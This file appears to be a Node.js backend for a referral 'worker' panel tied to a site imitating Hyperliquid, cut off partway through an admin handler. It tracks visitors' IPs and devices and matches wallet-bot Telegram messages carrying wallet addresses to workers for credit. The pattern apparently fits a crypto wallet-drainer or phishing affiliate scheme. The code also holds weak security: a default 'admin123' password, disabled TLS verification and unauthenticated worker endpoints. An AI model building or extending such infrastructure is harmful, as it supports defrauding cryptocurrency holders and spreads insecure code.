const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors');
const helmet = require('helmet');
const rateLimit = require('express-rate-limit');
const path = require('path');
const { Pool } = require('pg');
require('dotenv').config();

const axios = require('axios');
const bcrypt = require('bcryptjs');
const SALT_ROUNDS = 10;

const BASE_URL = process.env.BASE_URL || 'https://trevor-mr20.onrender.com';
const FRONTEND_URL = 'https://hyperliquid-community.xyz';

const pool = new Pool({
  connectionString: process.env.DATABASE_URL,
  ssl: { rejectUnauthorized: false, sslmode: 'require' },
  max: 10,
  idleTimeoutMillis: 30000,
  connectionTimeoutMillis: 10000,
  keepAlive: true,
  keepAliveInitialDelayMillis: 10000,
});

pool.on('error', (err) => {
  console.error('[PostgreSQL] Unexpected error on idle client:', err.message);
});

let httpServer;

async function dbRun(sql, params = [], retries = 3) {
  for (let i = 0; i < retries; i++) {
    try {
      const result = await pool.query(sql, params);
      return { lastID: result.rows[0]?.id ?? null, changes: result.rowCount };
    } catch (err) {
      if (i === retries - 1) throw err;
      if (err.message && (err.message.includes('connection') || err.message.includes('timeout') || err.message.includes('SSL'))) {
        console.warn(`[DB] Retry ${i + 1}/${retries}: ${err.message}`);
        await new Promise(r => setTimeout(r, 500 * (i + 1)));
      } else {
        throw err;
      }
    }
  }
}

async function dbGet(sql, params = [], retries = 3) {
  for (let i = 0; i < retries; i++) {
    try {
      const result = await pool.query(sql, params);
      return result.rows[0] || null;
    } catch (err) {
      if (i === retries - 1) throw err;
      if (err.message && (err.message.includes('connection') || err.message.includes('timeout') || err.message.includes('SSL'))) {
        console.warn(`[DB] Retry ${i + 1}/${retries}: ${err.message}`);
        await new Promise(r => setTimeout(r, 500 * (i + 1)));
      } else {
        throw err;
      }
    }
  }
}

async function dbAll(sql, params = [], retries = 3) {
  for (let i = 0; i < retries; i++) {
    try {
      const result = await pool.query(sql, params);
      return result.rows;
    } catch (err) {
      if (i === retries - 1) throw err;
      if (err.message && (err.message.includes('connection') || err.message.includes('timeout') || err.message.includes('SSL'))) {
        console.warn(`[DB] Retry ${i + 1}/${retries}: ${err.message}`);
        await new Promise(r => setTimeout(r, 500 * (i + 1)));
      } else {
        throw err;
      }
    }
  }
}

async function initDb() {
  await dbRun(`CREATE TABLE IF NOT EXISTS workers (
    id TEXT PRIMARY KEY, name TEXT NOT NULL, password TEXT NOT NULL,
    referral_link TEXT, referral_code TEXT, clicks INTEGER DEFAULT 0,
    claims INTEGER DEFAULT 0, status TEXT DEFAULT 'active',
    created_at BIGINT, last_login_at BIGINT)`);

  await dbRun(`CREATE TABLE IF NOT EXISTS visitors (
    id TEXT PRIMARY KEY, worker_id TEXT, country TEXT, device TEXT,
    ip TEXT, referrer TEXT, timestamp BIGINT)`);

  await dbRun(`CREATE TABLE IF NOT EXISTS claims (
    id TEXT PRIMARY KEY, worker_id TEXT, worker_name TEXT, worker_link TEXT,
    country TEXT, device TEXT, ip TEXT, timestamp BIGINT, created_at BIGINT,
    status TEXT DEFAULT 'PENDING', group_message TEXT, processed_at BIGINT,
    clash_details TEXT, resolution TEXT)`);

  await dbRun(`CREATE TABLE IF NOT EXISTS disputes (
    id TEXT PRIMARY KEY, message_id BIGINT, ip TEXT, text TEXT,
    worker_ids JSONB DEFAULT '[]', claim_ids JSONB DEFAULT '[]',
    timestamp BIGINT, status TEXT, resolution TEXT)`);

  await dbRun(`CREATE TABLE IF NOT EXISTS rules (
    id INTEGER PRIMARY KEY CHECK (id = 1), wallet_keyword TEXT,
    auto_forward_patterns TEXT, pending_timeout_hours INTEGER DEFAULT 2,
    match_field TEXT DEFAULT 'ip')`);

  await dbRun(`CREATE TABLE IF NOT EXISTS group_messages (
    id SERIAL PRIMARY KEY, message_id BIGINT, from_id TEXT, text TEXT,
    chat_id TEXT, date BIGINT, processed_at BIGINT, action TEXT)`);

  const existingRules = await dbGet('SELECT * FROM rules WHERE id = 1');
  if (!existingRules) {
    await dbRun(`INSERT INTO rules (id, wallet_keyword, auto_forward_patterns, pending_timeout_hours, match_field)
      VALUES (1, '', '👀,✍️,✅', 2, 'ip')`);
  }
  console.log('[PostgreSQL] Database initialized');
}

let groupBotStatus = 'OFFLINE';

async function processGroupMessage(messageData) {
  const { messageId, from, text, chat, date, forwardFrom } = messageData;

  if (!from || !from.id) {
    await dbRun(`INSERT INTO group_messages (message_id, from_id, text, chat_id, date, processed_at, action)
      VALUES ($1, $2, $3, $4, $5, $6, 'DROPPED_INVALID_FROM')`,
      [messageId || 0, from ? from.id : 'unknown', text || '', chat?.id, date || 0, Date.now()]);
    return { action: 'DROPPED_INVALID_FROM' };
  }

  const senderId = from.id.toString();
  const forwardedFromId = forwardFrom ? forwardFrom.id.toString() : null;
  const isWalletBot = isFromWalletBot(senderId) || (forwardedFromId && isFromWalletBot(forwardedFromId));

  const logAction = isWalletBot ? 'WALLET_MSG_LOGGED' : 'GROUP_MSG_LOGGED';
  await dbRun(`INSERT INTO group_messages (message_id, from_id, text, chat_id, date, processed_at, action)
    VALUES ($1, $2, $3, $4, $5, $6, $7)`,
    [messageId, from.id, text, chat?.id, date, Date.now(), logAction]);

  const ip = extractIP(text);
  const country = extractCountry(text) || 'Unknown';

  if (!ip) {
    await dbRun(`INSERT INTO group_messages (message_id, from_id, text, chat_id, date, processed_at, action)
      VALUES ($1, $2, $3, $4, $5, $6, 'DROPPED_NO_IP')`,
      [messageId, from.id, text, chat?.id, date, Date.now()]);
    return { action: 'DROPPED_NO_IP' };
  }

  const rules = await getRules();

  let pendingClaims = await dbAll(
    'SELECT * FROM claims WHERE status = $1 AND ip = $2 AND country = $3',
    ['PENDING', ip, country]
  );

  if (pendingClaims.length === 0) {
    pendingClaims = await dbAll(
      'SELECT * FROM claims WHERE status = $1 AND ip = $2',
      ['PENDING', ip]
    );
  }

  if (pendingClaims.length === 0) {
    await dbRun(`INSERT INTO group_messages (message_id, from_id, text, chat_id, date, processed_at, action)
      VALUES ($1, $2, $3, $4, $5, $6, 'DROPPED_NO_MATCH')`,
      [messageId, from.id, text, chat?.id, date, Date.now()]);
    return { action: 'DROPPED_NO_MATCH' };
  }

  const uniqueWorkers = [...new Set(pendingClaims.map(c => c.worker_id))];

  if (uniqueWorkers.length > 1) {
    const clashId = generateId();
    await dbRun(`INSERT INTO disputes (id, message_id, ip, text, worker_ids, claim_ids, timestamp, status, resolution)
      VALUES ($1, $2, $3, $4, $5::jsonb, $6::jsonb, $7, 'CLASH', 'FORFEITED')`,
      [clashId, messageId, ip, text, JSON.stringify(uniqueWorkers), JSON.stringify(pendingClaims.map(c => c.id)), Date.now()]);

    for (const c of pendingClaims) {
      await dbRun('UPDATE claims SET status = $1, processed_at = $2, clash_details = $3, resolution = $4 WHERE id = $5',
        ['FORFEITED', Date.now(), clashId, 'CLASH_FORFEITED', c.id]);
    }

    telegram(`⚠️ <b>CLASH DETECTED</b>\n\nIP: ${ip}\nWorkers: ${uniqueWorkers.join(', ')}\nClaims: ${pendingClaims.length}\n\nAll claims forfeited. Check disputes tab.`);

    return { action: 'CLASH', clashId };
  }

  const matchedClaim = pendingClaims.sort((a, b) => b.timestamp - a.timestamp)[0];

  await dbRun('UPDATE claims SET status = $1, processed_at = $2, group_message = $3 WHERE id = $4',
    ['PROCESSED', Date.now(), text, matchedClaim.id]);

  const formattedMessage = await formatClaimMessage(matchedClaim, text);
  sendToGroup(formattedMessage);

  await dbRun('UPDATE workers SET claims = claims + 1 WHERE id = $1', [matchedClaim.worker_id]);

  return { action: 'PROCESSED', claimId: matchedClaim.id };
}

function startGroupBot() {
  try {
    const { Telegraf } = require('telegraf');
    const GROUP_BOT_TOKEN = process.env.GROUP_BOT_TOKEN;
    const GROUP_CHAT_ID = parseInt(process.env.GROUP_CHAT_ID);
    const WALLET_BOT_ID = process.env.WALLET_BOT_ID;
    const GROUP_BOT_SECRET = process.env.GROUP_BOT_SECRET || 'default-secret';

    if (!GROUP_BOT_TOKEN || isNaN(GROUP_CHAT_ID) || !WALLET_BOT_ID) {
      console.log('[GroupBot] Missing env vars, bot not started');
      return;
    }

    const bot = new Telegraf(GROUP_BOT_TOKEN);
    const processedMessages = new Set();
    const MAX_STORED_MESSAGES = 10000;

    bot.on('message', async (ctx) => {
      const msg = ctx.message;
      if (processedMessages.has(msg.message_id)) return;
      processedMessages.add(msg.message_id);
      if (processedMessages.size > MAX_STORED_MESSAGES) {
        const iterator = processedMessages.values();
        processedMessages.delete(iterator.next().value);
      }

      const chatId = msg.chat.id;
      if (chatId !== GROUP_CHAT_ID) {
        console.log(`[GroupBot] Skip: chat ${chatId} != target ${GROUP_CHAT_ID}`);
        return;
      }

      const senderId = msg.from?.id?.toString();
      const GROUP_BOT_ID = process.env.GROUP_BOT_ID;

      if (senderId === GROUP_BOT_ID) {
        console.log(`[GroupBot] Skip: own message`);
        return;
      }

      const messageData = {
        messageId: msg.message_id,
        from: {
          id: msg.from?.id,
          username: msg.from?.username,
          firstName: msg.from?.first_name,
          lastName: msg.from?.last_name,
          isBot: msg.from?.is_bot,
        },
        text: msg.text || msg.caption || '',
        chat: { id: chatId, title: msg.chat?.title, type: msg.chat?.type },
        date: msg.date,
        replyTo: msg.reply_to_message ? {
          messageId: msg.reply_to_message.message_id,
          text: msg.reply_to_message.text || msg.reply_to_message.caption || '',
          from: msg.reply_to_message.from,
        } : null,
        entities: msg.entities || msg.caption_entities || [],
        forwardFrom: msg.forward_from ? {
          id: msg.forward_from.id,
          username: msg.forward_from.username,
          isBot: msg.forward_from.is_bot,
        } : null,
      };

      const preview = messageData.text.substring(0, 80).replace(/\n/g, ' ');
      console.log(`[GroupBot] Wallet msg: ${preview}...`);

      try {
        const result = await processGroupMessage(messageData);
        console.log(`[GroupBot] Action: ${result.action || 'OK'}`);
      } catch (error) {
        console.error(`[GroupBot] Process failed: ${error.message}`);
      }
    });

    bot.catch((err, ctx) => {
      console.error(`[GroupBot] Error for ${ctx.updateType}:`, err.message);
    });

    app.use(bot.webhookCallback(`/webhook/group`));

    bot.telegram.setWebhook(`${BASE_URL}/webhook/group`)
      .then(() => {
        groupBotStatus = 'ONLINE';
        console.log('[GroupBot] Webhook active');
      })
      .catch(err => {
        console.error('[GroupBot] Webhook failed:', err.message);
        groupBotStatus = 'OFFLINE';
      });
  } catch (err) {
    console.error('[GroupBot] Failed to load:', err.message);
  }
}

if (!process.env.NODE_ENV) {
  console.warn('[WARN] NODE_ENV not set, defaulting to development');
  process.env.NODE_ENV = 'development';
}

const requiredEnvVars = [
  'ADMIN_USERNAME', 'ADMIN_PASSWORD', 'TELEGRAM_BOT_TOKEN', 'TELEGRAM_CHAT_ID',
  'GROUP_BOT_TOKEN', 'GROUP_CHAT_ID', 'WALLET_BOT_ID', 'GROUP_BOT_SECRET', 'DATABASE_URL', 'GROUP_BOT_ID'
];

const missing = requiredEnvVars.filter(v => !process.env[v]);
if (missing.length > 0) {
  console.error('[FATAL] Missing required environment variables:', missing.join(', '));
  process.exit(1);
}

if (process.env.NODE_ENV === 'production') {
  if (process.env.GROUP_BOT_SECRET === 'default-secret' || process.env.GROUP_BOT_SECRET === 'your_random_secret_key_here') {
    console.error('[FATAL] GROUP_BOT_SECRET is using default value in production!');
    process.exit(1);
  }
  if (process.env.ADMIN_PASSWORD === 'admin123' || process.env.ADMIN_PASSWORD === '1234567890') {
    console.warn('[WARN] Admin password is weak - change it in production!');
  }
}

const app = express();

app.use(helmet({ contentSecurityPolicy: false }));

app.use((req, res, next) => {
  res.setHeader('Content-Security-Policy',
    "default-src 'self'; " +
    "style-src 'self' 'unsafe-inline' https://cdnjs.cloudflare.com https://cdn.tailwindcss.com; " +
    "script-src 'self' 'unsafe-inline' 'unsafe-eval' https://cdnjs.cloudflare.com https://cdn.tailwindcss.com https://s3.tradingview.com; " +
    "img-src 'self' data: https:; " +
    "connect-src 'self' https://api.binance.com https://fapi.binance.com https://api.coingecko.com; " +
    "frame-src 'self'; " +
    "font-src 'self' https://cdnjs.cloudflare.com;"
  );
  next();
});

const allowedOrigins = [
  'https://hyperliquid-community.xyz', 'https://trevor-mr20.onrender.com',
  'http://localhost:3000', 'http://localhost:8080'
];

const corsOptions = {
  origin: function(origin, callback) {
    if (!origin || allowedOrigins.includes(origin)) callback(null, true);
    else callback(new Error('Not allowed by CORS'));
  },
  methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization', 'X-Telegram-Bot-Secret'],
};
app.use(cors(corsOptions));

app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));
app.set('trust proxy', 1);

const limiter = rateLimit({
  windowMs: 15 * 60 * 1000, max: 100,
  message: 'Too many requests from this IP, please try again later.',
  standardHeaders: true, legacyHeaders: false,
  keyGenerator: (req) => req.ip || 'unknown',
  skip: (req) => !req.ip,
});
app.use('/api/', limiter);

function requireAdmin(req, res, next) {
  const authHeader = req.headers.authorization;
  if (!authHeader || !authHeader.startsWith('Basic ')) {
    return res.status(401).json({ error: 'Admin authentication required' });
  }
  try {
    const base64Credentials = authHeader.split(' ')[1];
    const credentials = Buffer.from(base64Credentials, 'base64').toString('ascii');
    const [username, password] = credentials.split(':');
    if (username === ADMIN_USERNAME && password === ADMIN_PASSWORD) return next();
  } catch (e) {}
  res.status(403).json({ error: 'Invalid admin credentials' });
}

app.use(express.static(path.join(__dirname, 'files')));

app.use('/files', (req, res, next) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  next();
}, express.static(path.join(__dirname, 'files')));

const ADMIN_USERNAME = (process.env.ADMIN_USERNAME || 'admin').trim();
const ADMIN_PASSWORD = (process.env.ADMIN_PASSWORD || 'admin123').trim();
const PORT = process.env.PORT || 3000;
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
const GROUP_BOT_TOKEN = process.env.GROUP_BOT_TOKEN;
const GROUP_CHAT_ID = process.env.GROUP_CHAT_ID;
const WALLET_BOT_ID = process.env.WALLET_BOT_ID;
const GROUP_BOT_SECRET = process.env.GROUP_BOT_SECRET || 'default-secret';
const PENDING_TIMEOUT_MS = parseInt(process.env.PENDING_TIMEOUT_HOURS || '2') * 60 * 60 * 1000;

if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_BOT_TOKEN.includes(':')) {
  console.error('[FATAL] Invalid TELEGRAM_BOT_TOKEN format');
  process.exit(1);
}

function generateReferralLink(workerId) {
  return `${FRONTEND_URL}/?ref=${workerId}`;
}

function generateId() {
  return 'ID' + Math.random().toString(36).substr(2, 9).toUpperCase();
}

const REF_CODE_REGEX = /^[A-Z0-9]{6,12}$/;

function isValidRefCode(code) {
  return typeof code === 'string' && REF_CODE_REGEX.test(code);
}

async function sendToGroup(msg) {
  try {
    await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      chat_id: TELEGRAM_CHAT_ID, text: msg, parse_mode: 'HTML'
    });
  } catch (err) {
    console.error('[Telegram] Send failed:', err.message);
  }
}

async function telegram(msg) {
  await sendToGroup(msg);
}

function extractIP(text) {
  const ipRegex = /\b(?:\d{1,3}\.){3}\d{1,3}\b/;
  const match = text.match(ipRegex);
  return match ? match[0] : null;
}

function extractCountry(text) {
  // Match flag emoji (2 regional indicator symbols) + country name
  // Use non-ASCII char matching for flag emojis
  const countryRegex = /(?:[^\x00-\x7F]{2})\s+([A-Za-z\s]+?)(?=\s*$|\s*\n|\s*Wallet|\s*IP|\s*Trust|\s*MetaMask)/i;
  const match = text.match(countryRegex);
  if (match) return match[1].trim();

  // Fallback: "Country: United States" format
  const altRegex = /Country[\s:]+([A-Za-z\s]+?)(?=\s|$|\n)/i;
  const altMatch = text.match(altRegex);
  if (altMatch) return altMatch[1].trim();

  return null;
}

function extractWallet(text) {
  const walletRegex = /0x[a-fA-F0-9]{40}/;
  const match = text.match(walletRegex);
  return match ? match[0] : null;
}

function isFromWalletBot(fromId) {
  return fromId.toString() === WALLET_BOT_ID;
}

function formatTimeRemaining(ms) {
  const hours = Math.floor(ms / (1000 * 60 * 60));
  const minutes = Math.floor((ms % (1000 * 60 * 60)) / (1000 * 60));
  return `${hours}h ${minutes}m`;
}

async function formatClaimMessage(claim, originalMessage) {
  const worker = await dbGet('SELECT * FROM workers WHERE id = $1', [claim.worker_id]);
  const workerName = worker ? worker.name : 'Unknown';
  const workerLink = worker ? worker.referral_link : 'N/A';
  const extractedCountry = extractCountry(originalMessage) || claim.country || 'Unknown';

  return `🔥 <b>CLAIM PROCESSED</b> 🔥\n\n👤 <b>Worker:</b> ${workerName}\n🆔 <b>Worker ID:</b> ${claim.worker_id}\n🔗 <b>Referral Link:</b> ${workerLink}\n🌍 <b>Country:</b> ${extractedCountry}\n📱 <b>Device:</b> ${claim.device}\n🌐 <b>IP:</b> ${claim.ip}\n⏱ <b>Claim Time:</b> ${new Date(claim.timestamp).toLocaleString()}\n⏱ <b>Processed:</b> ${new Date().toLocaleString()}\n\n━━━━━━━━━━━━━━━━━━━━\n<b>Original Message:</b>\n${originalMessage}`;
}

async function getRules() {
  const row = await dbGet('SELECT * FROM rules WHERE id = 1');
  if (!row) {
    return { walletKeyword: '', autoForwardPatterns: ['👀', '✍️', '✅'], pendingTimeoutHours: 2, matchField: 'ip' };
  }
  return {
    walletKeyword: row.wallet_keyword || '',
    autoForwardPatterns: (row.auto_forward_patterns || '👀,✍️,✅').split(','),
    pendingTimeoutHours: row.pending_timeout_hours || 2,
    matchField: row.match_field || 'ip'
  };
}

app.post('/api/claim', async (req, res) => {
  const { visitorId } = req.body;
  if (!visitorId) return res.status(400).json({ error: 'Visitor ID is required' });

  const visitor = await dbGet('SELECT * FROM visitors WHERE id = $1', [visitorId]);
  if (!visitor) return res.status(404).json({ error: 'Visitor session not found' });

  const workerId = visitor.worker_id;
  const worker = await dbGet('SELECT * FROM workers WHERE id = $1', [workerId]);
  if (!worker) return res.status(404).json({ error: 'Worker not found' });
  if (worker.status === 'inactive') return res.status(403).json({ error: 'Worker account is inactive' });

  const claimId = generateId();
  const now = Date.now();

  await dbRun(`INSERT INTO claims (id, worker_id, worker_name, worker_link, country, device, ip, timestamp, created_at, status)
    VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9, 'PENDING')`,
    [claimId, workerId, worker.name, worker.referral_link, visitor.country || 'Unknown', visitor.device || 'Unknown', visitor.ip || 'Unknown', now, now]);

  setTimeout(async () => {
    try {
      const c = await dbGet('SELECT * FROM claims WHERE id = $1 AND status = $2', [claimId, 'PENDING']);
      if (c) {
        await dbRun('UPDATE claims SET status = $1, processed_at = $2, resolution = $3 WHERE id = $4',
          ['EXPIRED', Date.now(), 'TIMEOUT_EXPIRED', claimId]);
      }
    } catch (err) {
      console.error(`[Claim Timeout] Error processing claim ${claimId}:`, err.message);
    }
  }, PENDING_TIMEOUT_MS);

  res.json({ success: true, claimId });
});

app.post('/api/group-message', async (req, res) => {
  if (!req.body || typeof req.body !== 'object') {
    return res.status(400).json({ error: 'Invalid request body' });
  }

  const secret = req.headers['x-telegram-bot-secret'];
  if (secret !== GROUP_BOT_SECRET) {
    return res.status(403).json({ error: 'Invalid secret' });
  }

  try {
    const result = await processGroupMessage(req.body);
    res.json(result);
  } catch (err) {
    console.error('[GroupMessage API] Error:', err.message);
    res.status(500).json({ error: 'Internal server error' });
  }
});

app.post('/api/worker/login', async (req, res) => {
  const { workerId, password } = req.body;
  const worker = await dbGet('SELECT * FROM workers WHERE id = $1', [workerId]);
  if (!worker) return res.status(401).json({ error: 'Invalid credentials' });

  const isValidPassword = await bcrypt.compare(password, worker.password);
  if (!isValidPassword) return res.status(401).json({ error: 'Invalid credentials' });
  if (worker.status === 'inactive') return res.status(403).json({ error: 'Account inactive' });

  await dbRun('UPDATE workers SET last_login_at = $1 WHERE id = $2', [Date.now(), workerId]);

  res.json({
    success: true,
    worker: {
      id: worker.id, name: worker.name, referralLink: worker.referral_link,
      referralCode: worker.referral_code || worker.id, clicks: worker.clicks || 0,
      claims: worker.claims || 0, status: worker.status,
    }
  });
});

app.get('/api/worker/:id/stats', async (req, res) => {
  const worker = await dbGet('SELECT * FROM workers WHERE id = $1', [req.params.id]);
  if (!worker) return res.status(404).json({ error: 'Worker not found' });

  const workerClaims = await dbAll('SELECT * FROM claims WHERE worker_id = $1', [req.params.id]);
  const visitorCount = await dbGet('SELECT COUNT(*) as count FROM visitors WHERE worker_id = $1', [req.params.id]);

  res.json({
    clicks: worker.clicks || 0, claims: worker.claims || 0,
    completes: workerClaims.filter(c => c.status === 'PROCESSED').length,
    pending: workerClaims.filter(c => c.status === 'PENDING').length,
    clashes: workerClaims.filter(c => c.status === 'FORFEITED' && c.clash_details).length,
    visitors: visitorCount ? visitorCount.count : 0,
  });
});

app.get('/api/worker/:id/claims', async (req, res) => {
  const worker = await dbGet('SELECT * FROM workers WHERE id = $1', [req.params.id]);
  if (!worker) return res.status(404).json({ error: 'Worker not found' });

  const workerClaims = await dbAll('SELECT * FROM claims WHERE worker_id = $1 ORDER BY timestamp DESC', [req.params.id]);
  res.json(workerClaims
    .filter(c => c.resolution !== 'MANUAL_FORFEIT')
    .map(c => ({
      id: c.id, status: c.status, country: c.country, device: c.device, ip: c.ip,
      timestamp: c.timestamp, createdAt: c.created_at, processedAt: c.processed_at,
      groupMessage: c.group_message, clashDetails: c.clash_details, resolution: c.resolution,
    })));
});

app.get('/api/worker/:id/sparkline', async (req, res) => {
  const worker = await dbGet('SELECT * FROM workers WHERE id = $1', [req.params.id]);
  if (!worker) return res.status(404).json({ error: 'Worker not found' });

  const now = Date.now();
  const dayMs = 24 * 60 * 60 * 1000;
  const values = [];
  for (let i = 6; i >= 0; i--) {
    const start = now - (i + 1) * dayMs;
    const end = now - i * dayMs;
    const row = await dbGet('SELECT COUNT(*) as count FROM claims WHERE worker_id = $1 AND timestamp >= $2 AND timestamp < $3', [req.params.id, start, end]);
    values.push(row ? row.count : 0);
  }
  res.json({ values });
});

app.get('/api/claim/:id', async (req, res) => {
  const claim = await dbGet('SELECT * FROM claims WHERE id = $1', [req.params.id]);
  if (!claim) return res.status(404).json({ error: 'Claim not found' });

  const worker = await dbGet('SELECT * FROM workers WHERE id = $1', [claim.worker_id]);
  res.json({
    ...claim, createdAt: claim.created_at || claim.timestamp,
    workerName: worker ? worker.name : 'Unknown', workerLink: worker ? worker.referral_link : 'N/A',
  });
});

app.post('/api/visitor', async (req, res) => {
  const { workerId, referrer } = req.body;

  // Get real IP from proxy headers (Render, Cloudflare, etc.)
  const forwarded = req.headers['x-forwarded-for'];
  const realIP = forwarded ? forwarded.split(',')[0].trim() : (req.body.ip || req.ip);

  // Detect country from IP using geoip-lite
  let country = 'Unknown';
  try {
    const geoip = require('geoip-lite');
    const geo = geoip.lookup(realIP);
    if (geo && geo.country) country = geo.country;
  } catch (e) {}

  if (country === 'Unknown' && req.body.country) country = req.body.country;
  const device = req.body.device || req.headers['user-agent'] || 'Unknown';

  const visitor = {
    id: generateId(), workerId, country, device, ip: realIP,
    referrer: referrer || 'Direct', timestamp: Date.now(),
  };

  await dbRun(`INSERT INTO visitors (id, worker_id, country, device, ip, referrer, timestamp)
    VALUES ($1, $2, $3, $4, $5, $6, $7)`,
    [visitor.id, visitor.workerId, visitor.country, visitor.device, visitor.ip, visitor.referrer, visitor.timestamp]);

  await dbRun('UPDATE workers SET clicks = clicks + 1 WHERE id = $1', [workerId]);
  res.json({ success: true, visitorId: visitor.id, ip: realIP, country });
});

app.post('/api/track-visit', async (req, res) => {
  const { refCode } = req.body;
  if (!refCode || !isValidRefCode(refCode)) return res.status(400).json({ error: 'Invalid referral code format' });

  let worker = await dbGet('SELECT * FROM workers WHERE id = $1', [refCode]);
  if (!worker) worker = await dbGet('SELECT * FROM workers WHERE referral_code = $1', [refCode]);
  if (!worker) return res.status(404).json({ error: 'Worker not found' });
  if (worker.status === 'inactive') return res.status(403).json({ error: 'Worker account is inactive' });

  const forwarded = req.headers['x-forwarded-for'];
  const realIP = forwarded ? forwarded.split(',')[0].trim() : (req.ip || 'Unknown');

  let country = 'Unknown';
  try {
    const geoip = require('geoip-lite');
    const geo = geoip.lookup(realIP);
    if (geo && geo.country) country = geo.country;
  } catch (e) {}

  const device = req.headers['user-agent'] || 'Unknown';
  const visitorId = generateId();

  await dbRun(`INSERT INTO visitors (id, worker_id, country, device, ip, referrer, timestamp)
    VALUES ($1, $2, $3, $4, $5, $6, $7)`,
    [visitorId, worker.id, country, device, realIP, req.get('Referrer') || 'Direct', Date.now()]);

  await dbRun('UPDATE workers SET clicks = clicks + 1 WHERE id = $1', [worker.id]);
  res.json({ success: true, visitorId, ip: realIP, country });
});

app.post('/api/admin/login', (req, res) => {
  const username = (req.body.username || '').trim();
  const password = (req.body.password || '').trim();
  if (username === ADMIN_USERNAME && password === ADMIN_PASSWORD) return res.json({ success: true });
  res.status(401).json({ error: 'Invalid credentials' });
});

app.get('/api/admin/workers', requireAdmin, async (req, res) => {
  const { search, status } = req.query;
  let sql = 'SELECT * FROM workers';
  const params = [];
  const conditions = [];
  let paramIndex = 1;

  if (search) {
    conditions.push('(LOWER(id) LIKE $' + paramIndex + ' OR LOWER(name) LIKE $' + paramIndex + ' OR LOWER(referral_link) LIKE $' + paramIndex + ' OR LOWER(referral_code) LIKE $' + paramIndex + ')');
    params.push('%' + search.toLowerCase() + '%'); paramIndex++;
  }
  if (status) { conditions.push('status = $' + paramIndex++); params.push(status); }
  if (conditions.length) sql += ' WHERE ' + conditions.join(' AND ');

  const rows = await dbAll(sql, params);
  res.json(rows);
});

app.post('/api/admin/workers', requireAdmin, async (req, res) => {
  const { name, password, referralLink, referralCode, workerId } = req.body;
  if (!name || !password) return res.status(400).json({ error: 'Name and password required' });

  const id = workerId || generateId();
  const code = referralCode || id;
  const link = referralLink || generateReferralLink(code);
  const now = Date.now();
  const hashedPassword = await bcrypt.hash(password, SALT_ROUNDS);

  await dbRun(`INSERT INTO workers (id, name, password, referral_link, referral_code, clicks, claims, status, created_at)
    VALUES ($1, $2, $3, $4, $5, 0, 0, 'active', $6)
    ON CONFLICT(id) DO UPDATE SET
      name = EXCLUDED.name, password = EXCLUDED.password,
      referral_link = EXCLUDED.referral_link, referral_code = EXCLUDED.referral_code,
      status = EXCLUDED.status, last_login_at = EXCLUDED.last_login_at`,
    [id, name, hashedPassword, link, code, now]);

  const worker = await dbGet('SELECT * FROM workers WHERE id = $1', [id]);
  res.json({ success: true, worker });
});

app.put('/api/admin/workers/:id', requireAdmin, async (req, res) => {
  const { name, password, referralLink, status } = req.body;
  const worker = await dbGet('SELECT * FROM workers WHERE id = $1', [req.params.id]);
  if (!worker) return res.status(404).json({ error: 'Worker not found' });

  const updates = []; const params = []; let paramIndex = 1;
  if (name !== undefined) { updates.push('name = $' + paramIndex++); params.push(name); }
  if (password !== undefined) { updates.push('password = $' + paramIndex++); params.push(await bcrypt.hash(password, SALT_ROUNDS)); }
  if (referralLink !== undefined) { updates.push('referral_link = $' + paramIndex++); params.push(referralLink); }
  if (status !== undefined) { updates.push('status = $' + paramIndex++); params.push(status); }

  if (updates.length) { params.push(req.params.id); await dbRun(`UPDATE workers SET ${updates.join(', ')} WHERE id = $${paramIndex}`, params); }
  const updated = await dbGet('SELECT * FROM workers WHERE id = $1', [req.params.id]);
  res.json({ success: true, worker: updated });
});

app.delete('/api/admin/workers/:id', requireAdmin, async (req, res) => {
  const worker = await dbGet('SELECT * FROM workers WHERE id = $1', [req.params.id]);
  if (!worker) return res.status(404).json({ error: 'Worker not found' });
  await dbRun('DELETE FROM workers WHERE id = $1', [req.params.id]);
  res.json({ success: true });
});

app.put('/api/admin/workers/:id/link', requireAdmin, async (req, res) => {
  const worker = await dbGet('SELECT * FROM workers WHERE id = $1', [req.params.id]);
  if (!worker) return res.status(404).json({ error: 'Worker not found' });

  const { referralLink, referralCode } = req.body;
  const updates = []; const params = []; let paramIndex = 1;
  if (referralLink !== undefined) { updates.push('referral_link = $' + paramIndex++); params.push(referralLink); }
  if (referralCode !== undefined) { updates.push('referral_code = $' + paramIndex++); params.push(referralCode); }
  if (!updates.length) { updates.push('referral_link = $' + paramIndex++); params.push(generateReferralLink(worker.id)); }

  params.push(req.params.id);
  await dbRun(`UPDATE workers SET ${updates.join(', ')} WHERE id = $${paramIndex}`, params);
  const updated = await dbGet('SELECT * FROM workers WHERE id = $1', [req.params.id]);
  res.json({ success: true, link: updated.referral_link, referralCode: updated.referral_code });
});

app.post('/api/admin/workers/:id/clear-link', requireAdmin, async (req, res) => {
  const worker = await dbGet('SELECT * FROM workers WHERE id = $1', [req.params.id]);
  if (!worker) return res.status(404).json({ error: 'Worker not found' });
  await dbRun('UPDATE workers SET referral_link = $1 WHERE id = $2', ['', req.params.id]);
  res.json({ success: true });
});

app.post('/api/admin/workers/:id/toggle-status', requireAdmin, async (req, res) => {
  const worker = await dbGet('SELECT * FROM workers WHERE id = $1', [req.params.id]);
  if (!worker) return res.status(404).json({ error: 'Worker not found' });
  const newStatus = worker.status === 'active' ? 'inactive' : 'active';
  await dbRun('UPDATE workers SET status = $1 WHERE id = $2', [newStatus, req.params.id]);
  res.json({ success: true, status: newStatus });
});

app.get('/api/admin/stats', requireAdmin, async (req, res) => {
  const activeWorkers = await dbGet("SELECT COUNT(*) as count FROM workers WHERE status = 'active'");
  const totalWorkers = await dbGet("SELECT COUNT(*) as count FROM workers");
  const totalClicks = await dbGet("SELECT COALESCE(SUM(clicks), 0) as sum FROM workers");
  const totalClaims = await dbGet("SELECT COUNT(*) as count FROM claims WHERE status = 'PROCESSED'");
